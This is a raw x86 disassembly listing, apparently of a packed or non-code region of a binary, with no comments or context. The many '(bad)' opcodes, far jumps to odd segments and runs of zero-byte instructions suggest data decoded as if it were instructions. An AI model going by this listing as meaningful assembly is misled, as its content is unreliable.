  447fb6:	push   ds
  447fb7:	sbb    DWORD PTR [edx],edx
  447fb9:	xor    eax,0xcd90f
  447fbe:	inc    edi
  447fbf:	or     al,BYTE PTR [ebp-0x492839fc]
  447fc5:	xor    DWORD PTR ds:0x96760de7,0x1
  447fcc:	ja     0x447fc6
  447fce:	add    BYTE PTR [eax],al
  447fd0:	add    BYTE PTR [eax],al
  447fd2:	add    BYTE PTR [edi-0x1d172d01],ah
  447fd8:	std    
  447fd9:	mov    dh,0xf7
  447fdb:	or     edx,DWORD PTR [esi-0x472afee8]
  447fe1:	xchg   ebx,eax
  447fe2:	cmp    eax,0xbfd1d9b3
  447fe7:	aad    0x1
  447fe9:	or     eax,0x69db9000
  447fee:	cmp    eax,0x405ed4b3
  447ff3:	xchg   ecx,eax
  447ff4:	(bad)  
  447ff5:	jne    0x447ff7
  447ff7:	nop
  447ff8:	(bad)  ds:0xb946680f
  447ffe:	test   DWORD PTR [edi+0x59],0xe6910e31
  448005:	add    eax,DWORD PTR [ebx+0x760dfdbd]
  44800b:	mov    bl,0x83
  44800d:	xchg   ebx,eax
  44800e:	clc    
  44800f:	das    
  448010:	test   ebx,edx
  448012:	xor    eax,0xcdc50
  448017:	pushf  
  448018:	sbb    eax,0x8251c264
  44801d:	push   cs
  44801e:	mov    ecx,edx
  448020:	pop    eax
  448021:	lods   eax,DWORD PTR ds:[esi]
  448022:	pop    es
  448023:	adc    esp,DWORD PTR [edx+0x588b6ce1]
  448029:	mov    ch,0x0
  44802b:	jl     0x447fdf
  44802d:	mov    ch,0x9b
  44802f:	jb     0x44801b
  448031:	pop    es
  448032:	test   eax,0xf9fd31d3
  448037:	add    BYTE PTR [eax],al
  448039:	add    BYTE PTR [eax],al
  44803b:	add    BYTE PTR [ebp+ebx*4+0x74],ch
  44803f:	stos   DWORD PTR es:[edi],eax
  448040:	xchg   edx,eax
  448041:	pop    edi
  448042:	stc    
  448043:	fwait
  448044:	(bad)  
  448045:	jmp    0x4de:0x31d3a8e7
  44804c:	sub    eax,0xb8410fac
  448051:	in     eax,0xef
  448053:	les    edx,FWORD PTR [ebx]
  448055:	in     al,dx
  448056:	lock cmps BYTE PTR cs:[esi],BYTE PTR es:[edi]
  448059:	int    0x2
  44805b:	lods   al,BYTE PTR ds:[esi]
  44805c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44805d:	in     eax,0xb3
  44805f:	test   BYTE PTR [ecx+0x78022aad],bl
  448065:	mov    ds:0xf17fa8cf,eax
  44806a:	jae    0x448016
  44806c:	xchg   edi,eax
  44806d:	pop    edi
  44806e:	icebp  
  44806f:	fwait
  448070:	xchg   esi,eax
  448071:	jmp    0xaf0d:0xda53a8af
  448078:	pop    edi
  448079:	in     eax,0x6b
  44807b:	ds jp  0x448031
  44807e:	xor    ah,ch
  448080:	adc    ch,BYTE PTR [edi-0x2c]
  448083:	add    eax,0xe31ed53
  448088:	nop
  448089:	mov    dl,0xf7
  44808b:	add    ecx,DWORD PTR [ebx]
  44808d:	outs   dx,DWORD PTR ds:[esi]
  44808e:	aam    0xf8
  448090:	in     eax,0x71
  448092:	mul    dh
  448094:	out    0xb1,al
  448096:	test   DWORD PTR [ebx],0xe64fc39f
  44809c:	sub    al,0xe5
  44809e:	push   edi
  44809f:	test   BYTE PTR [eax],al
  4480a1:	add    BYTE PTR [eax],al
  4480a3:	add    BYTE PTR [eax],al
  4480a5:	popf   
  4480a6:	mov    esp,0xdac229f8
  4480ab:	es mov al,0xff
  4480ae:	in     al,0xd
  4480b0:	sub    dh,dh
  4480b2:	and    al,0xe
  4480b4:	jmp    0x7077df4c
  4480b9:	aad    0xf2
  4480bb:	repz in eax,0x6a
  4480be:	repz mov WORD PTR [eax],cs
  4480c1:	fsubr  DWORD PTR [edi]
  4480c3:	in     al,0xdf
  4480c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4480c6:	mov    ecx,0x58ca008d
  4480cb:	call   DWORD PTR [eax]
  4480cd:	or     ch,dl
  4480cf:	call   0xe47554ca
  4480d4:	fisub  WORD PTR [esi-0x1c]
  4480d7:	lock lods eax,DWORD PTR ds:[esi]
  4480d9:	(bad)  
  4480da:	fsub   st(0),st
  4480dc:	stos   BYTE PTR es:[edi],al
  4480dd:	add    al,0x15
  4480df:	loop   0x4480b7
  4480e1:	idiv   DWORD PTR [eax]
  4480e3:	push   ebx
  4480e4:	repz mov WORD PTR [edi-0x702e95d3],fs
  4480eb:	or     al,0xaa
  4480ed:	inc    edi
  4480ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4480ef:	add    al,0xe9
  4480f1:	xchg   ebx,eax
  4480f2:	mov    dl,0xe
  4480f4:	vmaxsd xmm2{k1},xmm6,xmm4,{sae}
  4480fa:	mov    cl,0x2b
  4480fc:	pop    esi
  4480fd:	mov    WORD PTR [edx-0x2568e9f2],?
  448103:	les    edx,FWORD PTR [ebp+0x48cdc2f]
  448109:	add    BYTE PTR [eax],al
  44810b:	add    BYTE PTR [eax],al
  44810d:	add    BYTE PTR [esi+0x12ef5ce6],bl
  448113:	pop    esi
  448114:	add    bh,ch
  448116:	outs   dx,DWORD PTR ds:[esi]
  448117:	mov    edx,0xe385ec8d
  44811c:	addr16 jmp 0x448129
  44811f:	jb     0x448117
  448121:	imul   esi,edi,0x292ae8db
  448127:	and    al,0xe
  448129:	jmp    0x66dfc1
  44812e:	xor    al,0xce
  448131:	jmp    0xdb48:0x83cf66ed
  448138:	mov    edi,edx
  44813a:	xlat   BYTE PTR ds:[ebx]
  44813b:	mov    ds:0xe6b0831b,al
  448140:	popa   
  448141:	and    BYTE PTR [edx+0x15],bh
  448144:	or     eax,0xe730e274
  448149:	add    bh,ch
  44814b:	mov    ch,0xf6
  44814d:	push   ebp
  44814e:	into   
  44814f:	or     al,0xe1
  448151:	ret    
  448152:	cmp    bl,BYTE PTR [eax]
  448154:	adc    DWORD PTR [ebp-0x4e],esi
  448157:	xor    bh,ah
  448159:	or     BYTE PTR ds:0xce45f0e5,ah
  44815f:	or     al,0xe1
  448161:	ret    
  448162:	rcl    edi,0xf4
  448165:	inc    esi
  448167:	push   0x72a81a2b
  44816c:	sub    eax,0xecfbc83
  448171:	ret    
  448172:	add    BYTE PTR [eax],al
  448174:	add    BYTE PTR [eax],al
  448176:	add    BYTE PTR [esi],ch
  448178:	jb     0x44817e
  44817a:	add    BYTE PTR [ecx-0x51],ch
  44817d:	push   cs
  44817e:	mov    ebp,DWORD PTR [edi+ecx*8-0x524649f1]
  448185:	and    edi,DWORD PTR [edi+0x7f0eaf79]
  44818b:	pop    eax
  44818c:	inc    edi
  44818d:	inc    edx
  44818e:	hlt    
  44818f:	push   es
  448190:	or     al,0x8d
  448192:	jge    0x448203
  448194:	in     al,0x62
  448196:	and    ah,BYTE PTR [ecx]
  448198:	fdivr  st(7),st
  44819a:	inc    esi
  44819c:	lock and al,al
  44819f:	sub    DWORD PTR [edi+0x662c7c0e],ebp
  4481a5:	int3   
  4481a6:	rol    ebx,0xe3
  4481a9:	xchg   ebp,eax
  4481aa:	rcl    DWORD PTR [eax+0x1307b258],0x7f
  4481b1:	out    0x6c,al
  4481b3:	xchg   esi,eax
  4481b4:	sbb    DWORD PTR [esi+ebp*8-0x17335bf9],0xf7b0a7f6
  4481bf:	or     ecx,DWORD PTR [esi]
  4481c1:	pop    ss
  4481c2:	add    DWORD PTR [ebp-0x8],edx
  4481c5:	mov    edi,DWORD PTR ds:0xbfcbd7b3
  4481cb:	push   ebp
  4481cc:	fisttp WORD PTR [eax+eax*1]
  4481cf:	nop
  4481d0:	fldenv [ebx+0x3d]
  4481d3:	jae    0x4481b1
  4481d5:	jp     0x448217
  4481d7:	xchg   ecx,eax
  4481d8:	es jo  0x4481db
  4481db:	add    BYTE PTR [eax],al
  4481dd:	add    BYTE PTR [eax],al
  4481df:	add    BYTE PTR [eax-0x57e6d027],dl
  4481e5:	into   
  4481e6:	mov    eax,0x3157aff7
  4481eb:	push   cs
  4481ec:	lea    edi,[ebp-0x16]
  4481ef:	sbb    BYTE PTR ds:0x9276e9e3,0xf0
  4481f6:	(bad)  
  4481f8:	inc    ebp
  4481f9:	and    dh,BYTE PTR [ebx-0x3320ac09]
  4481ff:	add    BYTE PTR [eax+0x91d30cb],dl
  448205:	push   cs
  448206:	int    0xea
  448208:	xchg   esp,eax
  448209:	(bad)  
  44820a:	int    0x83
  44820c:	jno    0x4481df
  44820e:	(bad)  
  44820f:	cli    
  448210:	mov    WORD PTR [esi-0x2ba67d19],?
  448216:	xor    BYTE PTR [ecx],dl
  448218:	cmp    BYTE PTR [eax+0xd47f7b8],al
  44821e:	(bad)  
  44821f:	cli    
  448220:	(bad)  
  448221:	fsubp  st(2),st
  448223:	out    0x9,eax
  448225:	push   0xffffffb3
  448227:	not    DWORD PTR [ebx-0x4d]
  44822a:	aas    
  44822b:	sub    BYTE PTR [ebx],ah
  44822d:	loop   0x448276
  44822f:	jns    0x44828e
  448231:	mov    esp,0x35733ef6
  448236:	mov    dl,0xe0
  448238:	xchg   ecx,eax
  448239:	cmc    
  44823a:	aaa    
  44823b:	aas    
  44823c:	stos   BYTE PTR es:[edi],al
  44823d:	mov    dl,0xf7
  44823f:	add    edx,DWORD PTR [eax+0xe0ba2d]
  448245:	add    BYTE PTR [eax],al
  448247:	add    BYTE PTR [eax],al
  448249:	mov    gs,WORD PTR [eax]
  44824b:	mov    bh,0x2
  44824d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44824e:	and    edi,esi
  448250:	add    edx,DWORD PTR [eax+0x309be661]
  448256:	out    0xff,al
  448258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448259:	adc    esp,DWORD PTR [eax-0x1f]
  44825c:	cld    
  44825d:	inc    ebp
  44825e:	cdq    
  44825f:	call   DWORD PTR [eax-0x4a]
  448262:	loope  0x44824b
  448264:	rol    BYTE PTR [ebp-0x6ffc090e],0x5e
  44826b:	mov    ebp,0xbcf3d27a
  448270:	call   FWORD PTR [eax]
  448272:	hlt    
  448273:	jae    0x448217
  448275:	xchg   edi,eax
  448276:	xor    eax,0xad24f6bd
  44827b:	je     0x448227
  44827d:	cdq    
  44827e:	data16 stc 
  448280:	fwait
  448281:	ret    0xa7e8
  448284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448285:	push   ebx
  448286:	retf   0xb119
  448289:	jg     0x44826c
  44828b:	imul   edi,DWORD PTR [esi],0xffffff8a
  44828e:	mov    bl,0x3a
  448290:	loope  0x4482a4
  448292:	ja     0x448268
  448294:	add    DWORD PTR [ebx-0x7],edx
  448297:	cmp    DWORD PTR [edx],ecx
  448299:	nop
  44829a:	mov    dl,0xf7
  44829c:	add    ebx,DWORD PTR [ebx]
  44829e:	ja     0x448274
  4482a0:	hlt    
  4482a1:	cmc    
  4482a2:	jno    0x44829a
  4482a4:	out    0x6,al
  4482a6:	mov    dl,0xe
  4482a8:	jmp    0x8143ec40
  4482ad:	add    BYTE PTR [eax],al
  4482af:	add    BYTE PTR [eax],al
  4482b1:	add    BYTE PTR [edx-0x1b],ch
  4482b4:	call   0xab931f
  4482b9:	out    0x75,al
  4482bb:	test   dh,dh
  4482bd:	push   ebp
  4482be:	out    0xe8,al
  4482c0:	call   0xe6578ef
  4482c5:	jmp    0x7097e95d
  4482ca:	shl    edx,1
  4482cc:	repz in eax,dx
  4482ce:	jp     0x4482c3
  4482d0:	mov    WORD PTR [eax-0x1c],cs
  4482d3:	xor    esp,esp
  4482d5:	cmc    
  4482d6:	mov    dh,0xe0
  4482d8:	lock or DWORD PTR [esi],ebp
  4482db:	jmp    0xdc54adc8
  4482e0:	sbb    dl,BYTE PTR [ebp+ecx*8-0xc033d28]
  4482e7:	call   0xb82dedb8
  4482ec:	arpl   cx,bx
  4482ee:	adc    bl,bl
  4482f0:	or     eax,0xe7359875
  4482f5:	icebp  
  4482f6:	jo     0x4482a8
  4482f8:	imul   BYTE PTR [ecx-0x55171707]
  4482fe:	paddusb mm3,QWORD PTR [eax]
  448301:	push   esp
  448302:	lahf   
  448303:	xor    esp,edi
  448305:	icebp  
  448306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448307:	loopne 0x4482f9
  448309:	jns    0x448324
  44830b:	call   0x14692df8
  448310:	fsubr  QWORD PTR [esi+0x3532c33]
  448316:	add    BYTE PTR [eax],al
  448318:	add    BYTE PTR [eax],al
  44831a:	add    BYTE PTR [ebp-0x3695d263],cl
  448320:	xchg   ebx,eax
  448321:	or     al,0xaa
  448323:	inc    eax
  448324:	neg    ecx
  448326:	int    0xd3
  448328:	fsubp  st(0),st
  44832a:	add    BYTE PTR [ecx],bh
  44832c:	mov    ah,0xe
  44832e:	add    BYTE PTR [ecx],ch
  448330:	mov    ah,0xe
  448332:	add    BYTE PTR [ebp+0x76],dh
  448335:	jmp    0x19ff:0xe8dcc9ff
  44833c:	add    ebp,esp
  44833e:	jmp    FWORD PTR [ecx]
  448340:	mov    ah,0xe
  448342:	add    BYTE PTR [ecx],ch
  448344:	mov    ah,0xe
  448346:	add    bl,al
  448348:	jo     0x448334
  44834a:	inc    ebp
  44834c:	out    0xe8,al
  44834e:	dec    DWORD PTR [ecx]
  448350:	shl    ah,cl
  448352:	(bad)  
  448353:	jmp    0xf944920b
  448358:	mov    bl,0xe
  44835a:	add    BYTE PTR [ecx-0x5b],bl
  44835d:	jmp    0x4dff:0xe8e785ff
  448364:	std    
  448365:	in     al,0xff
  448367:	mov    ecx,0xb9000eb3
  44836c:	mov    bl,0xe
  44836e:	add    BYTE PTR [edi],ch
  448370:	call   0xffe8:0xe3a9ffea
  448377:	rcl    edx,0xe4
  44837a:	(bad)  
  44837b:	mov    ecx,0xeb3
  448380:	add    BYTE PTR [eax],al
  448382:	add    BYTE PTR [eax],al
  448384:	test   eax,0x4b000eb3
  448389:	pushf  
  44838a:	jmp    0x81ff:0xe8e7cdff
  448391:	shl    ah,cl
  448393:	jmp    FWORD PTR [ecx-0x4d]
  448396:	push   cs
  448397:	add    BYTE PTR [ecx-0x4d],ch
  44839a:	push   cs
  44839b:	add    BYTE PTR [ecx],dl
  44839d:	cdq    
  44839e:	jmp    0xedff:0xe8e7cdff
  4483a5:	shl    ah,cl
  4483a7:	call   DWORD PTR [eax-0x6ffff337]
  4483ad:	leave  
  4483ae:	or     al,0x0
  4483b0:	nop
  4483b1:	retf   
  4483b2:	and    edi,esp
  4483b4:	aas    
  4483b5:	sub    eax,esp
  4483b7:	push   DWORD PTR [edi]
  4483b9:	mov    ecx,0xc92ffc52
  4483be:	or     al,0x0
  4483c0:	nop
  4483c1:	leave  
  4483c2:	or     al,0x0
  4483c4:	nop
  4483c5:	aas    
  4483c6:	and    al,0xfc
  4483c8:	pop    ss
  4483c9:	sub    eax,0x210fffe7
  4483ce:	retf   
  4483cf:	sti    
  4483d0:	pop    es
  4483d1:	leave  
  4483d2:	or     al,0x0
  4483d4:	nop
  4483d5:	leave  
  4483d6:	or     al,0x0
  4483d8:	nop
  4483d9:	aaa    
  4483da:	and    eax,0xdd5ceffc
  4483df:	jmp    edi
  4483e1:	adc    ah,ch
  4483e3:	sti    
  4483e4:	(bad)  
  4483e6:	or     al,0x0
  4483e8:	add    BYTE PTR [eax],al
  4483ea:	add    BYTE PTR [eax],al
  4483ec:	add    BYTE PTR [eax-0x6ffff337],dl
  4483f2:	dec    edi
  4483f3:	sub    bh,ah
  4483f5:	(bad)  
  4483f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4483f7:	out    0xff,al
  4483f9:	mov    edi,0xb7fbcb24
  4483fe:	enter  0xc,0x90
  448402:	leave  
  448403:	or     al,0x0
  448405:	nop
  448406:	push   ebx
  448407:	sub    ah,bh
  448409:	lahf   
  44840a:	pusha  
  44840b:	loop   0x44840c
  44840d:	xchg   edi,eax
  44840e:	nop
  44840f:	out    dx,eax
  448410:	sti    
  448411:	(bad)  
  448412:	int3   
  448413:	or     al,0x0
  448415:	nop
  448416:	retf   
  448417:	or     al,0x0
  448419:	nop
  44841a:	sub    DWORD PTR [ebx],0xe18877fc
  448420:	jmp    FWORD PTR [edi+0x28]
  448423:	out    dx,al
  448424:	sti    
  448425:	addr16 mov bl,0xf7
  448428:	add    edx,DWORD PTR [eax-0x6ffc084e]
  44842e:	mov    dl,0x9
  448430:	cmp    eax,0xf52ede4c
  448435:	inc    edi
  448436:	ficomp WORD PTR [edx-0x921c420]
  44843c:	add    edx,DWORD PTR [eax-0x6ffc084e]
  448442:	mov    dl,0x1f
  448444:	cmp    eax,0xf52ede24
  448449:	pop    ds
  44844a:	fimul  WORD PTR [esi-0x921e422]
  448450:	add    eax,DWORD PTR [eax]
  448452:	add    BYTE PTR [eax],al
  448454:	add    BYTE PTR [eax],al
  448456:	nop
  448457:	mov    dl,0xf7
  448459:	add    edx,DWORD PTR [eax-0x3c2ce4e]
  44845f:	fstp   QWORD PTR [edx-0xc]
  448462:	neg    ebp
  448464:	test   BYTE PTR [ebx-0x14],0xdd
  448468:	test   BYTE PTR [ebx],0x90
  44846b:	mov    dl,0xf7
  44846d:	add    edx,DWORD PTR [eax-0x2bc07c4e]
  448473:	(bad)  [edx-0x41223007]
  448479:	loopne 0x448446
  44847b:	(bad)  
  44847d:	add    edx,DWORD PTR [eax-0x6ffc084e]
  448483:	mov    dl,0x35
  448485:	inc    eax
  448486:	lods   al,BYTE PTR ds:[esi]
  448487:	fisttp QWORD PTR [edx-0x9]
  44848a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44848b:	(bad)  
  44848d:	add    edx,DWORD PTR [eax-0x6ffc084e]
  448493:	mov    dl,0xf7
  448495:	add    edx,DWORD PTR [eax-0x6ffc084e]
  44849b:	mov    dl,0xf7
  44849d:	add    edx,DWORD PTR [eax+0x743835b2]
  4484a3:	fisttp QWORD PTR ds:0xe8dea2a9
  4484a9:	xchg   ecx,eax
  4484aa:	mov    ds:0xa297e8de,al
  4484af:	fsubp  st(0),st
  4484b1:	jmp    0xfe2d6353
  4484b6:	test   esi,ebx
  4484b8:	call   0x448582
  4484bd:	add    BYTE PTR [eax],al
  4484bf:	jge    0x44849f
  4484c1:	call   0xe9230a89
  4484c6:	and    edi,DWORD PTR [esi-0x22]
  4484c9:	call   0xe922eacd
  4484ce:	aas    
  4484cf:	pop    ebp
  4484d0:	fsubp  st(0),st
  4484d2:	xor    esp,DWORD PTR [ebp-0x22]
  4484d5:	call   0xe922e221
  4484da:	push   edi
  4484db:	(bad)
  4484de:	sti    
  4484df:	mov    esp,0xc50de8de
  4484e4:	fsubp  st(0),st
  4484e6:	idiv   DWORD PTR [esi+ebx*8-0x215b5418]
  4484ed:	call   0xe9232187
  4484f2:	lea    esp,[esi+ebx*8-0x21636018]
  4484f9:	call   0xe9230977
  4484fe:	inc    ebp
  4484ff:	jl     0x4484df
  448501:	call   0xe9230943
  448506:	sub    edi,DWORD PTR [esi+ebx*8-0x18]
  44850a:	sbb    eax,0x1e8de64
  44850f:	pop    esp
  448510:	fsubp  st(0),st
  448512:	pop    ebx
  448513:	pop    eax
  448514:	fsubp  st(0),st
  448516:	inc    ebx
  448517:	pop    eax
  448518:	fsubp  st(0),st
  44851a:	test   ebp,eax
  44851c:	fsubp  st(0),st
  44851e:	add    ecx,eax
  448520:	fsubp  st(0),st
  448522:	add    BYTE PTR [eax],al
  448524:	add    BYTE PTR [eax],al
  448526:	add    BYTE PTR [eax],al
  448528:	pop    ecx
  448529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44852a:	jmp    0x79ff:0xeaa037ff
  448531:	mov    al,0xe
  448533:	add    BYTE PTR [ebx-0x62],bl
  448536:	jmp    0xa5ff:0xea9a43ff
  44853d:	cwde   
  44853e:	jmp    0xf9ff:0xea989dff
  448545:	popf   
  448546:	jmp    0x13ff:0xea9a45ff
  44854d:	sahf   
  44854e:	jmp    0x39ff:0xea9dd3ff
  448555:	mov    al,0xe
  448557:	add    BYTE PTR [ebp-0x68],cl
  44855a:	jmp    0x41ff:0xea9831ff
  448561:	cwde   
  448562:	jmp    0x73ff:0xea9e67ff
  448569:	sahf   
  44856a:	jmp    0x39ff:0xea9843ff
  448571:	cwde   
  448572:	jmp    0xc1ff:0xea97ddff
  448579:	xchg   edi,eax
  44857a:	jmp    0xb1ff:0xea9e91ff
  448581:	xchg   edi,eax
  448582:	jmp    0x71ff:0xeaa3abff
  448589:	mov    ds:0xffea,eax
  44858e:	add    BYTE PTR [eax],al
  448590:	add    BYTE PTR [ecx+0x3dffeaa3],al
  448596:	sahf   
  448597:	jmp    0xef00:0xeafb9ff
  44859e:	cwde   
  44859f:	jmp    0x9000:0xeafa9ff
  4485a6:	ret    
  4485a7:	push   edi
  4485a8:	cld    
  4485a9:	xchg   DWORD PTR [ebx-0x708003a9],edi
  4485af:	push   edi
  4485b0:	cld    
  4485b1:	ja     0x448628
  4485b3:	push   edi
  4485b4:	cld    
  4485b5:	outs   dx,DWORD PTR ds:[esi]
  4485b6:	cdq    
  4485b7:	push   edi
  4485b8:	cld    
  4485b9:	lea    edx,[bx-0x4]
  4485bd:	pop    edi
  4485be:	arpl   WORD PTR [esi-0x4],dx
  4485c1:	push   edi
  4485c2:	pop    ebx
  4485c3:	push   esi
  4485c4:	cld    
  4485c5:	dec    edi
  4485c6:	jae    0x44861e
  4485c8:	cld    
  4485c9:	inc    edi
  4485ca:	or     DWORD PTR [esi-0x4],edx
  4485cd:	aas    
  4485ce:	cmp    eax,0x4137fc56
  4485d3:	push   esi
  4485d4:	cld    
  4485d5:	das    
  4485d6:	pop    edi
  4485d7:	push   esi
  4485d8:	cld    
  4485d9:	daa    
  4485da:	stc    
  4485db:	push   edx
  4485dc:	cld    
  4485dd:	pop    ds
  4485de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4485df:	push   eax
  4485e0:	cld    
  4485e1:	pop    ss
  4485e2:	mov    bh,0x50
  4485e4:	cld    
  4485e5:	nop    DWORD PTR [ebx-0x4]
  4485e9:	pop    es
  4485ea:	cmc    
  4485eb:	push   edx
  4485ec:	cld    
  4485ed:	call   FWORD PTR [edx]
  4485ef:	push   ebx
  4485f0:	cld    
  4485f1:	test   DWORD PTR [ebx+edx*2-0x4],0x0
  4485f9:	add    bh,ch
  4485fb:	adc    BYTE PTR [ebx-0x4],0xe7
  4485ff:	pop    eax
  448600:	push   ebx
  448601:	cld    
  448602:	fbld   TBYTE PTR [ebx+edx*2+0x53a6d7fc]
  448609:	cld    
  44860a:	iret   
  44860b:	mov    esi,0xc6c7fc53
  448610:	dec    edi
  448611:	cld    
  448612:	mov    edi,0xb7fc4ff8
  448617:	cli    
  448618:	dec    edi
  448619:	cld    
  44861a:	scas   eax,DWORD PTR es:[edi]
  44861b:	push   ss
  44861c:	push   eax
  44861d:	cld    
  44861e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44861f:	or     BYTE PTR [eax-0x4],dl
  448622:	lahf   
  448623:	mov    cl,0x27
  448625:	inc    ebp
  448626:	xchg   esp,eax
  448627:	fidivr DWORD PTR [esi]
  448629:	inc    ebp
  44862a:	mov    edx,ds
  44862c:	jbe    0x448673
  44862e:	test   dl,bl
  448630:	pop    esp
  448631:	inc    ebp
  448632:	jl     0x44860e
  448634:	jle    0x44867b
  448636:	je     0x448612
  448638:	sahf   
  448639:	inc    ebp
  44863a:	ins    BYTE PTR es:[edi],dx
  44863b:	fiadd  DWORD PTR [edx-0x5f259bbb]
  448641:	inc    ebp
  448642:	pop    esp
  448643:	(bad)  
  448645:	dec    ebx
  448646:	push   esp
  448647:	(bad)  
  448649:	dec    ebx
  44864a:	dec    esp
  44864b:	fcmovb st,st(6)
  44864d:	dec    ebx
  44864e:	inc    esp
  44864f:	fidiv  DWORD PTR [edx]
  448651:	dec    esp
  448652:	cmp    al,0xda
  448654:	xor    cl,BYTE PTR [esp+esi*1-0x26]
  448658:	sbb    cl,BYTE PTR [esp+ebp*1-0x26]
  44865c:	fmul   QWORD PTR [ebx+0x0]
  44865f:	add    BYTE PTR [eax],al
  448661:	add    BYTE PTR [eax],al
  448663:	and    al,0xda
  448665:	ins    BYTE PTR es:[edi],dx
  448666:	dec    esp
  448667:	sbb    al,0xda
  448669:	nop
  44866a:	dec    esp
  44866b:	adc    al,0xda
  44866d:	jl     0x4486bb
  44866f:	or     al,0xda
  448671:	jle    0x4486bf
  448673:	add    al,0xda
  448675:	sub    al,0x4c
  448677:	cld    
  448678:	fst    DWORD PTR [esi+0x4c]
  44867b:	hlt    
  44867c:	fldenv [esp+ecx*2]
  44867f:	in     al,dx
  448680:	fxtract 
  448682:	dec    edx
  448683:	in     al,0xd9
  448685:	(bad)  
  448686:	dec    edx
  448687:	(bad)  
  448689:	(bad)  
  44868a:	dec    edx
  44868b:	aam    0xd9
  44868d:	ret    0xcc4a
  448690:	fnstenv [edx+ecx*2+0x4aa6d9c4]
  448697:	mov    esp,0xb44ab0d9
  44869c:	fldcw  WORD PTR [edx+0x4a]
  44869f:	lods   al,BYTE PTR ds:[esi]
  4486a0:	(bad)  ds:0xe8d65b67
  4486a6:	cmp    eax,0xa5e8d64b
  4486ab:	dec    edx
  4486ac:	(bad)  
  4486ad:	call   0xe91b616b
  4486b2:	(bad)  
  4486b3:	fcmovbe st,st(6)
  4486b5:	call   0xe91b50a1
  4486ba:	or     edx,ecx
  4486bc:	(bad)  
  4486bd:	call   0xe91b60d1
  4486c2:	neg    ecx
  4486c4:	(bad)  
  4486c5:	call   0x4486e9
  4486ca:	add    BYTE PTR [eax],al
  4486cc:	retf   0xe8d6
  4486cf:	adc    ecx,edx
  4486d1:	(bad)  
  4486d2:	call   0xe91b60f4
  4486d7:	jnp    0x4486b2
  4486d9:	(bad)  
  4486da:	call   0xe91b5024
  4486df:	aas    
  4486e0:	leave  
  4486e1:	(bad)  
  4486e2:	call   0xe91af5c6
  4486e7:	jmp    0x44874f
  4486e9:	(bad)  
  4486ea:	call   0xe91b5a1e
  4486ef:	cmp    edx,ebx
  4486f1:	(bad)  
  4486f2:	call   0xe91ada3c
  4486f7:	push   ecx
  4486f8:	push   ebx
  4486f9:	(bad)  
  4486fa:	call   0xe91ad9e6
  4486ff:	fist   DWORD PTR [edx-0x2a]
  448702:	call   0xe91ada18
  448707:	std    
  448708:	push   edx
  448709:	(bad)  
  44870a:	call   0xe91ad9ba
  44870f:	mov    ebx,0x8be8d652
  448714:	push   edx
  448715:	(bad)  
  448716:	call   0xe91ad9b6
  44871b:	(bad)  
  44871c:	push   edx
  44871d:	(bad)  
  44871e:	call   0xeab8e223
  448723:	call   FWORD PTR [ebx+0x74]
  448726:	jmp    0x77ff:0xea7469ff
  44872d:	je     0x448719
  44872f:	inc    DWORD PTR [eax]
  448731:	add    BYTE PTR [eax],al
  448733:	add    BYTE PTR [eax],al
  448735:	retf   
  448736:	outs   dx,BYTE PTR ds:[esi]
  448737:	jmp    0x63ff:0xea6e5fff
  44873e:	outs   dx,BYTE PTR ds:[esi]
  44873f:	jmp    0x5bff:0xea6e77ff
  448746:	outs   dx,BYTE PTR ds:[esi]
  448747:	jmp    0x6bff:0xea6e4fff
  44874e:	outs   dx,BYTE PTR ds:[esi]
  44874f:	jmp    0xcdff:0xea707fff
  448756:	jo     0x448742
  448758:	jmp    DWORD PTR [ebx+0x3ffea70]
  44875e:	fwait
  44875f:	jmp    0x93ff:0xea9abdff
  448766:	jo     0x448752
  448768:	jmp    DWORD PTR [ebx-0x42001590]
  44876e:	jo     0x44875a
  448770:	jmp    DWORD PTR [ebp+0x70]
  448773:	jmp    0xbdff:0xea7181ff
  44877a:	jo     0x448766
  44877c:	call   DWORD PTR [ebp+0x70]
  44877f:	jmp    0x4dff:0xea7059ff
  448786:	jo     0x448772
  448788:	jmp    ebx
  44878a:	jo     0x448776
  44878c:	inc    ebx
  44878e:	jo     0x44877a
  448790:	jmp    ebp
  448792:	jo     0x44877e
  448794:	jmp    FWORD PTR [ecx]
  448796:	jno    0x448782
  448798:	inc    DWORD PTR [eax]
  44879a:	add    BYTE PTR [eax],al
  44879c:	add    BYTE PTR [eax],al
  44879e:	std    
  44879f:	jo     0x44878b
  4487a1:	call   DWORD PTR [eax-0x4003afd7]
  4487a7:	cmp    eax,0x45b7fc50
  4487ac:	push   ecx
  4487ad:	cld    
  4487ae:	scas   eax,DWORD PTR es:[edi]
  4487af:	jge    0x448802
  4487b1:	cld    
  4487b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4487b3:	imul   edx,DWORD PTR [ecx-0x4],0xffffff9f
  4487b7:	fwait
  4487b8:	push   ecx
  4487b9:	cld    
  4487ba:	xchg   edi,eax
  4487bb:	and    edx,DWORD PTR [eax-0x4]
  4487be:	(bad)  
  4487bf:	repz dec edi
  4487c1:	cld    
  4487c2:	xchg   ebx,edi
  4487c4:	dec    edi
  4487c5:	cld    
  4487c6:	jg     0x448799
  4487c8:	sub    ah,bh
  4487ca:	ja     0x44879b
  4487cc:	sub    ah,bh
  4487ce:	outs   dx,DWORD PTR ds:[esi]
  4487cf:	(bad)  [eax]
  4487d1:	cld    
  4487d2:	test   DWORD PTR [bp-0x4],ecx
  4487d6:	pop    edi
  4487d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4487d8:	dec    esi
  4487d9:	cld    
  4487da:	push   edi
  4487db:	mov    bh,0x4e
  4487dd:	cld    
  4487de:	dec    edi
  4487df:	dec    edi
  4487e0:	sub    esp,edi
  4487e2:	inc    edi
  4487e3:	push   edi
  4487e4:	sub    esp,edi
  4487e6:	aas    
  4487e7:	xchg   ebp,eax
  4487e8:	sub    esp,edi
  4487ea:	aaa    
